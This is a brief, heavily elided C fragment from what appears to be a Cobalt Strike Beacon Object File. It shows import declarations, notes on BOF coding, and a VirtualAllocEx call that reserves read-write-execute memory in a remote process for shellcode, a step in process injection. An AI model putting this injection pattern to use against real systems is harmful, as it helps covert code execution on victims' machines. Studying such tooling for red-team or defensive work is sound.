...
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI USER32$MessageBoxA (HWND   hWnd,LPCSTR lpText, LPCSTR lpCaption,UINT   uType);
...
void go(char * args, int len) {
    ...
    // Declare booleans as BOOL in BOFs. "bool" will not work
    BOOL check1 = 0;
    BOOL check2 = 0;
    BOOL check3 = 0;
    BOOL check4 = 0;
    ...
    // PAGE_EXECUTE_READWRITE --> allocates RWX
    remotePayloadAddr = KERNEL32$VirtualAllocEx(pInfo.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
